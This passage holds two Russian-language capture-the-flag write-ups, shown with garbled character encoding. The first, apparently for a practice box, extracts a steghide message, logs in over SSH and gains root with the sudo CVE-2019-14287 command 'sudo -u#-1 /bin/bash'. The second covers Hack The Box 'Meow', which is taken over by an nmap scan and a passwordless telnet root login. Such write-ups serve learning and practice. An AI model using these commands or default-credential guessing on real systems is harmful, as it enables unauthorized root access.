(–∏–ª–∏) –≤—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É –Ω–∏–∂–µ –¥–ª—è –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è

```
echo -n 'QXJlYTUx' | base64 -d
```

![[Pasted image 20240424153917.png]]

–¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å Area51. –ö–∞–∂–µ—Ç—Å—è, –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω—ã–º –æ—Å—Ç–∞–≤—à–∏–º—Å—è —Ñ–∞–π–ª–æ–º —è–≤–ª—è–µ—Ç—Å—è –Ω–∞—à–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ jpg. steghide —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è –¥–∞–Ω–Ω—ã—Ö –≤–Ω—É—Ç—Ä–∏ —Ñ–∞–π–ª–æ–≤ jpg —Å –ø–æ–º–æ—â—å—é –ø–∞—Ä–æ–ª—å–Ω–æ–π —Ñ—Ä–∞–∑—ã. –í–æ–∑–º–æ–∂–Ω–æ, –ø–æ—ç—Ç–æ–º—É –≤ –æ–¥–Ω–æ–º –∏–∑ –≤–æ–ø—Ä–æ—Å–æ–≤ –Ω–∞—Å –ø—Ä–æ—Å—è—Ç –≤–≤–µ—Å—Ç–∏ –ø–∞—Ä–æ–ª—å steg.

## –ù–µ–º–Ω–æ–≥–æ —Å—Ç–µ–≥–∞–Ω–æ

–ú—ã –º–æ–∂–µ–º –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –µ—Å—Ç—å –ª–∏ —á—Ç–æ —Å–∫—Ä—ã–≤–∞—Ç—å –≤ –Ω–∞—à–µ–º jpg, –∏ —ç—Ç–æ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —Ç–∞–∫ —Å –ø–∞—Ä–æ–ª–µ–º¬†**Area51.**

**–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ steghide cute-alien.jpg**

![[Pasted image 20240424154001.png]]

–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —ç—Ç–æ–≥–æ –ø–∞—Ä–æ–ª—è –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –∏–∑ cute-alien.jpg:

```
steghide ‚Äîextract -sf cute-alien.jpg
```

![[Pasted image 20240424154109.png]]

```
cat message.txt
```

![[Pasted image 20240424154144.png]]

## –î–æ—Å—Ç—É–ø –∫ ssh 

–¢–µ–ø–µ—Ä—å –º—ã –≤–æ—à–ª–∏ –≤ —Å–∏—Å—Ç–µ–º—É —á–µ—Ä–µ–∑ SSH, –∏—Å–ø–æ–ª—å–∑—É—è –Ω–∞–π–¥–µ–Ω–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –ø–∞—Ä–æ–ª—å. –¢–µ–ø–µ—Ä—å –º—ã –º–æ–∂–µ–º –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Ñ–ª–∞–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

```
ssh james@10.10.25.88
```

–° –ø–∞—Ä–æ–ª–µ–º¬†**hackerrules!**

![[Pasted image 20240424154430.png]]

![[Pasted image 20240424154438.png]]

–ê –¥—Ä—É–≥–æ–µ ‚Äî –∏–º–∏–¥–∂. –ù–∞–º –Ω—É–∂–Ω–æ –≤—ã—è—Å–Ω–∏—Ç—å, –æ—Ç–∫—É–¥–∞ –≤–∑—è—Ç–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ. –í—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å –º–∞—à–∏–Ω—ã –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –æ–±—Ä–∞—Ç–Ω—ã–π –ø–æ–∏—Å–∫ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π –≤ Google.

```
scp james@10.10.25.88:Alien_autospy.jpg /home/
```

![[Pasted image 20240424155130.png]]

## –≠—Å–∫–∞–ª–∞—Ü–∏—è

–ú—ã –ø—Ä–æ–≤–µ—Ä–∏–ª–∏ –ø—Ä–∞–≤–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã ¬´sudo -l¬ª.

![[Pasted image 20240424155203.png]]

–ü–æ—Ö–æ–∂–µ, –Ω–∞—à–µ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –Ω–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ –∑–∞–ø—É—Å–∫–∞—Ç—å /bin/bash –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root, –ø–æ—Å–∫–æ–ª—å–∫—É —É –Ω–∞—Å –µ—Å—Ç—å —Ñ–∞–π–ª ! –∫–æ—Ä–µ–Ω—å. –û–¥–Ω–∞–∫–æ —ç—Ç–æ –≤—ã–≥–ª—è–¥–∏—Ç —Å—Ç—Ä–∞–Ω–Ω–æ, –ø–æ—Å–∫–æ–ª—å–∫—É –ø–µ—Ä–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –Ω–∞—à –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å /bin/bash –æ—Ç –∏–º–µ–Ω–∏ –ª—é–±–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –≠—Ç–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ, –≤–æ–∑–º–æ–∂–Ω–æ, –º—ã —Å–º–æ–∂–µ–º –Ω–∞–π—Ç–∏ —Å–ø–æ—Å–æ–± –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ.

–ü–æ —Å—á–∞—Å—Ç–ª–∏–≤–æ–π —Å–ª—É—á–∞–π–Ω–æ—Å—Ç–∏, –ø–æ–∏—Å–∫ –≤ Google –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –Ω–∞–º —á—Ç–æ-—Ç–æ, —á—Ç–æ –º—ã –º–æ–≥–ª–∏ –±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è root-–ø—Ä–∞–≤.

–ú—ã –∏—Å–∫–∞–ª–∏ –≤ Google –∏ –Ω–∞—à–ª–∏ —É—è–∑–≤–∏–º–æ—Å—Ç—å –¥–ª—è Sudo –¥–ª—è –≤–µ—Ä—Å–∏–∏ 1.8, –ø–æ—ç—Ç–æ–º—É –ø—Ä–æ–≤–µ—Ä–∏–ª–∏ –≤–µ—Ä—Å–∏—é sudo.

![[Pasted image 20240424155254.png]]

```
sudo -V
```

–°–æ–≥–ª–∞—Å–Ω–æ¬†[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287 .](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)

–í Sudo –¥–æ –≤–µ—Ä—Å–∏–∏ 1.8.28 –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫, –∏–º–µ—é—â–∏–π –¥–æ—Å—Ç—É–ø –∫ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ sudoer Runas ALL, –º–æ–∂–µ—Ç –æ–±–æ–π—Ç–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ —á–µ—Ä–Ω—ã–µ —Å–ø–∏—Å–∫–∏ –ø–æ–ª–∏—Ç–∏–∫ –∏ –º–æ–¥—É–ª–∏ PAM —Å–µ–∞–Ω—Å–∞, –∞ —Ç–∞–∫–∂–µ –≤—ã–∑–≤–∞—Ç—å –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –≤–µ–¥–µ–Ω–∏–µ –∂—É—Ä–Ω–∞–ª–∞, –≤—ã–∑–≤–∞–≤ sudo —Å–æ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ —Å–æ–∑–¥–∞–Ω–Ω—ã–º –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ù–∞–ø—Ä–∏–º–µ—Ä, —ç—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–±–æ–π—Ç–∏! –∫–æ—Ä–Ω–µ–≤–∞—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –∏ –≤–µ–¥–µ–Ω–∏–µ –∂—É—Ä–Ω–∞–ª–∞ USER= –¥–ª—è –∫–æ–º–∞–Ω–¥—ã sudo -u \#$((0xffffffff))

–ù–∞—à–∞ –≤–µ—Ä—Å–∏—è sudo –Ω–∏–∂–µ 1.8.28, –ø–æ—ç—Ç–æ–º—É –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç—É –º–∞—à–∏–Ω—É. –ò—Å–ø–æ–ª—å–∑—É—è –Ω–∞–π–¥–µ–Ω–Ω—ã–π –Ω–∞–º–∏ —ç–∫—Å–ø–ª–æ–π—Ç, –º—ã –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –º–æ–∂–µ–º —Å–æ–∑–¥–∞—Ç—å –∫–æ—Ä–Ω–µ–≤—É—é –æ–±–æ–ª–æ—á–∫—É –∏ –ø–æ–ª—É—á–∏—Ç—å –Ω–∞—à –∫–æ—Ä–Ω–µ–≤–æ–π —Ñ–ª–∞–≥.

```
sudo -u#-1 /bin/bash
```

![[Pasted image 20240424155912.png]]

–¢–µ–ø–µ—Ä—å –º—ã root!

![[Pasted image 20240424155930.png]]

---

# Meow

**–ü–ª–æ—à–∞–¥–∫–∞:** https://hackthebox.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy
**–ó–∞–¥–∞—á–∞:** –ù–∞–π—Ç–∏ —Ñ–∞–π–ª **flag.txt**

## –†–∞–∑–≤–µ–¥–∫–∞

## –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ

–ü–µ—Ä–≤–æ–µ, —á—Ç–æ —è —Å–æ–±–∏—Ä–∞—é—Å—å —Å–¥–µ–ª–∞—Ç—å, —ç—Ç–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å **—Å –ø–æ–º–æ—â—å—é nmap .** —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –º–∞—à–∏–Ω—ã.

**Nmap** –æ–∑–Ω–∞—á–∞–µ—Ç **Network Mapper** , –∏ –æ–Ω –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∑–∞–ø—Ä–æ—Å—ã –Ω–∞ –ø–æ—Ä—Ç—ã —Ü–µ–ª–∏ –≤ –Ω–∞–¥–µ–∂–¥–µ –ø–æ–ª—É—á–∏—Ç—å –æ—Ç–≤–µ—Ç, —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º –æ–ø—Ä–µ–¥–µ–ª—è—è, –æ—Ç–∫—Ä—ã—Ç —É–∫–∞–∑–∞–Ω–Ω—ã–π –ø–æ—Ä—Ç –∏–ª–∏ –Ω–µ—Ç. –ù–µ–∫–æ—Ç–æ—Ä—ã–µ –ø–æ—Ä—Ç—ã –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–º–∏ —Å–ª—É–∂–±–∞–º–∏. –î—Ä—É–≥–∏–µ –º–æ–≥—É—Ç –±—ã—Ç—å –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–º–∏, –ø–æ—ç—Ç–æ–º—É –º—ã –±—É–¥–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ–ª–∞–≥ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è —Å–ª—É–∂–±—ã **-sV** –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –∏–º–µ–Ω–∏ –∏ –æ–ø–∏—Å–∞–Ω–∏—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å–ª—É–∂–±.

```bash
‚îÄ$ nmap -sC -sV -oA meow 10.129.45.206
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 23:35 EST
Nmap scan report for 10.129.45.206
Host is up (0.052s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Pasted image 20230703033000.png]]

–ü–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –º—ã –æ–ø—Ä–µ–¥–µ–ª–∏–ª–∏, —á—Ç–æ –ø–æ—Ä—Ç **23/TCP** –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–º –∑–∞–ø—É—â–µ–Ω–∞ —Å–ª—É–∂–±–∞ telnet.

## –î–æ—Å—Ç—É–ø –∫ —Å–ª—É–∂–±–µ Telnet (Weak password)

**Telnet** ‚Äî —ç—Ç–æ —Å—Ç–∞—Ä–∞—è —Å–ª—É–∂–±–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –¥—Ä—É–≥–∏–º–∏ —Ö–æ—Å—Ç–∞–º–∏ –≤ —Å–µ—Ç–∏.

–ß—Ç–æ–±—ã —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç–µ–ª–Ω–µ—Ç –Ω–∞ WSL:

```bash
‚îå‚îÄ‚îÄ(irs„âøirs)-[~]

‚îî‚îÄ$apt-get install —Çtelnet
```

  
–ü–æ—Å–∫–æ–ª—å–∫—É –Ω–∞ —Ü–µ–ª–µ–≤–æ–º –æ–±—ä–µ–∫—Ç–µ –∑–∞–ø—É—â–µ–Ω–∞ —Å–ª—É–∂–±–∞ ¬´ **Telnet** ¬ª, –æ–Ω –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∞—Ç—å –∑–∞–ø—Ä–æ—Å—ã –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ telnet –æ—Ç –¥—Ä—É–≥–∏—Ö —Ö–æ—Å—Ç–æ–≤ –≤ —Å–µ—Ç–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –æ—Ç –Ω–∞—Å) —Å –ø–æ–º–æ—â—å—é —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.

```bash
‚îå‚îÄ‚îÄ(irs„âøirs)-[~]

‚îî‚îÄ$ telnet 10.129.157.37
```

  
–û–±—ã—á–Ω–æ –∑–∞–ø—Ä–æ—Å—ã –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —á–µ—Ä–µ–∑ telnet –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞—é—Ç—Å—è —Å **–∫–æ–º–±–∏–Ω–∞—Ü–∏–µ–π –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è** –∏ **–ø–∞—Ä–æ–ª—è** –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –ú—ã –º–æ–∂–µ–º –≤–∏–¥–µ—Ç—å, —á—Ç–æ —ç—Ç–æ –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ –Ω–∞—à–µ–π —Ü–µ–ª–∏, –ø–æ—Å–∫–æ–ª—å–∫—É –Ω–∞—Å –≤—Å—Ç—Ä–µ—á–∞–µ—Ç –±–∞–Ω–Ω–µ—Ä Hack the Box –∏ –∑–∞–ø—Ä–æ—Å –æ—Ç —Ü–µ–ª–∏ –Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é, –ø—Ä–µ–∂–¥–µ —á–µ–º –Ω–∞–º –±—É–¥–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–æ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å —É–¥–∞–ª–µ–Ω–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ü–µ–ª–µ–≤—ã–º —Ö–æ—Å—Ç–æ–º.

```python
‚îî‚îÄ$ telnet 10.129.45.206
Trying 10.129.45.206...
Connected to 10.129.45.206.
Escape character is '^]'.


  ‚ñà  ‚ñà         ‚ñê‚ñå     ‚ñÑ‚ñà‚ñÑ ‚ñà          ‚ñÑ‚ñÑ‚ñÑ‚ñÑ
  ‚ñà‚ñÑ‚ñÑ‚ñà ‚ñÄ‚ñÄ‚ñà ‚ñà‚ñÄ‚ñÄ ‚ñê‚ñå‚ñÑ‚ñÄ    ‚ñà  ‚ñà‚ñÄ‚ñà ‚ñà‚ñÄ‚ñà    ‚ñà‚ñå‚ñÑ‚ñà ‚ñÑ‚ñÄ‚ñÄ‚ñÑ ‚ñÄ‚ñÑ‚ñÄ
  ‚ñà  ‚ñà ‚ñà‚ñÑ‚ñà ‚ñà‚ñÑ‚ñÑ ‚ñê‚ñà‚ñÄ‚ñÑ    ‚ñà  ‚ñà ‚ñà ‚ñà‚ñÑ‚ñÑ    ‚ñà‚ñå‚ñÑ‚ñà ‚ñÄ‚ñÑ‚ñÑ‚ñÄ ‚ñà‚ñÄ‚ñà


Meow login: 
Password:
```

–ù–∞–º –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω —ç–∫—Ä–∞–Ω –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É. –û–¥–Ω–∞–∫–æ –ø–æ–∫–∞ –º—ã –Ω–µ –∑–Ω–∞–µ–º, –∫–∞–∫–∏–º –º–æ–∂–µ—Ç –±—ã—Ç—å –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è/–ø–∞—Ä–æ–ª—å. –ù–∞–º –Ω—É–∂–Ω–æ –Ω–∞–π—Ç–∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ, —á—Ç–æ–±—ã –º—ã –º–æ–≥–ª–∏ –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –≤–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É.

–ù–∞–º –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç –Ω–∞–π—Ç–∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ —Ä–∞–±–æ—Ç–∞—é—Ç, —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å, –ø–æ—Å–∫–æ–ª—å–∫—É –Ω–∞ —Ü–µ–ª–∏ –Ω–µ—Ç –¥—Ä—É–≥–∏—Ö –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –º–æ–≥–ª–∏ –±—ã –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç—å.

–¢–∞–∫ –∫–∞–∫ —ç—Ç–∞ –º–∞—à–∏–Ω–∞ —Å—á–∏—Ç–∞–µ—Ç—Å—è ¬´–û—á–µ–Ω—å –ª–µ–≥–∫–æ–π¬ª. –ú—ã –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º, —á—Ç–æ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –≤—Ö–æ–¥–∞ –±—É–¥—É—Ç —á–µ–º-—Ç–æ –ø—Ä–æ—Å—Ç—ã–º –∏ –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º—ã–º.

–ò–Ω–æ–≥–¥–∞ –∏–∑-–∑–∞ –æ—à–∏–±–æ–∫ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –≤–∞–∂–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –∑–∞–ø–∏—Å–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –æ—Å—Ç–∞–≤–ª–µ–Ω—ã —Å –ø—É—Å—Ç—ã–º–∏ –ø–∞—Ä–æ–ª—è–º–∏ –¥–ª—è –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏. –≠—Ç–æ —Å–µ—Ä—å–µ–∑–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞ —Å –Ω–µ–∫–æ—Ç–æ—Ä—ã–º–∏ —Å–µ—Ç–µ–≤—ã–º–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞–º–∏ –∏–ª–∏ —Ö–æ—Å—Ç–∞–º–∏, –æ—Å—Ç–∞–≤–ª—è—é—â–∞—è –∏—Ö –æ—Ç–∫—Ä—ã—Ç—ã–º–∏ –¥–ª—è –ø—Ä–æ—Å—Ç—ã—Ö –∞—Ç–∞–∫ –º–µ—Ç–æ–¥–æ–º –ø–µ—Ä–µ–±–æ—Ä–∞, –∫–æ–≥–¥–∞ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –≤–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –∏—Å–ø–æ–ª—å–∑—É—è —Å–ø–∏—Å–æ–∫ –∏–º–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –±–µ–∑ –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è. –ù–µ–∫–æ—Ç–æ—Ä—ã–µ —Ç–∏–ø–∏—á–Ω—ã–µ –≤–∞–∂–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –∑–∞–ø–∏—Å–∏ –∏–º–µ—é—Ç –ø–æ–Ω—è—Ç–Ω—ã–µ –∏–º–µ–Ω–∞, –Ω–∞–ø—Ä–∏–º–µ—Ä:

  - admin
  - administrator
  - root

–ß—Ç–æ –∫–∞—Å–∞–µ—Ç—Å—è –ø–∞—Ä–æ–ª—è, –¥–∞–≤–∞–π—Ç–µ –ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ –µ–≥–æ –Ω–µ—Ç, –ø–æ—Ç–æ–º—É —á—Ç–æ –∏–Ω–æ–≥–¥–∞ –æ–Ω–∏ –æ—Å—Ç–∞—é—Ç—Å—è –ø—É—Å—Ç—ã–º–∏ –∏–ª–∏ –æ—á–µ–Ω—å –ø—Ä–æ—Å—Ç—ã–º–∏, —Ç–∞–∫–∏–º–∏ –∫–∞–∫ `password`, `password123`, –∏–ª–∏ –¥–∞–∂–µ `12345678`.

–î–∞–≤–∞–π—Ç–µ —Å–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä–∏–º —ç—Ç–∏ –∏–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –±–µ–∑ –ø–∞—Ä–æ–ª—è!

```python
Meow login: admin
Password: 

Login incorrect
Meow login: administrator
Password: 

Login incorrect
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 26 Feb 2022 05:05:33 AM UTC
```

–•–æ—Ä–æ—à–æ –±—ã —è –ø–æ—Å–º–æ—Ç—Ä–µ–ª –Ω–∞ —ç—Ç–æ! –ú—ã –º–æ–∂–µ–º –≤–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É –∫–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å root –±–µ–∑ –ø–∞—Ä–æ–ª—è!

–ú—ã –º–æ–∂–µ–º –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å, —á—Ç–æ –º—ã –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —è–≤–ª—è–µ–º—Å—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º root:

```
root@Meow:~# whoami
root
```

–ò –∫–æ–≥–¥–∞ –º—ã –ø—Ä–æ–≤–µ—Ä—è–µ–º —Ç–µ–∫—É—â–∏–π –∫–∞—Ç–∞–ª–æ–≥, `flag.txt`—ç—Ç–æ –ø–µ—Ä–≤–æ–µ, —á—Ç–æ –º—ã –≤–∏–¥–∏–º:

```
root@Meow:~# ls                                                                             
flag.txt  snap
```

–ó–∞—Ç–µ–º –º—ã –º–æ–∂–µ–º –∑–∞–ø—É—Å—Ç–∏—Ç—å `cat flag.txt` –∫–æ–º–∞–Ω–¥–∞ —Ä–∞—Å–∫—Ä—ã—Ç—å —Ñ–ª–∞–≥! –ë—ã–ª–∏ —Å–¥–µ–ª–∞–Ω—ã!

## –ö—Ä–∞—Ç–∫–æ–µ —Å–æ–¥–µ—Ä–∂–∞–Ω–∏–µ

–Ø –∑–Ω–∞—é, —á—Ç–æ —ç—Ç–æ –æ—á–µ–Ω—å –∫–æ—Ä–æ—Ç–∫–∞—è –∏ –ø—Ä–æ—Å—Ç–∞—è –º–∞—à–∏–Ω–∞ –Ω–∞ Hack The Box, –Ω–æ —ç—Ç–æ –≤—Å–µ –µ—â–µ –æ–±—É—á–µ–Ω–∏–µ –∏ –ø—Ä–∞–∫—Ç–∏–∫–∞. –≠—Ç–æ –æ—Ç–ª–∏—á–Ω–æ –ø–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –ø—Ä–∏–≤—ã–∫–Ω—É—Ç—å –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é **Nmap** –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é **telnet** . –ü—Ä–æ–±–ª–µ–º–∞ —Å —ç—Ç–∏–º –≤—Ö–æ–¥–æ–º –≤ telnet —Å–≤—è–∑–∞–Ω–∞ —Å –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –Ω–∞—Å—Ç—Ä–æ–π–∫–æ–π —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏. –ì–¥–µ –≤–∞–∂–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, `root`–≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ –Ω–µ –∏–º–µ–µ—Ç –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–∞—Ä–æ–ª—è, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞–º –æ—á–µ–Ω—å –ª–µ–≥–∫–æ –ø—Ä–æ–Ω–∏–∫–Ω—É—Ç—å –≤ —Å–∏—Å—Ç–µ–º—É. –≠—Ç–∞ –º–∞—à–∏–Ω–∞ –Ω–µ —É–≥–ª—É–±–ª—è–µ—Ç—Å—è –≤ —Ç–æ, –∫–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–ª—É–∂–±—ã telnet, –Ω–æ, –ø–æ –∫—Ä–∞–π–Ω–µ–π –º–µ—Ä–µ, –º—ã –º–æ–∂–µ–º –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –≤–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É –∏ –ø–æ–Ω—è—Ç—å, —á—Ç–æ –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –≤—Ö–æ–¥–∞, —á—Ç–æ–±—ã –≤–∑–ª–æ–º–∞—Ç—å –Ω–∞—à –ø—É—Ç—å. –í 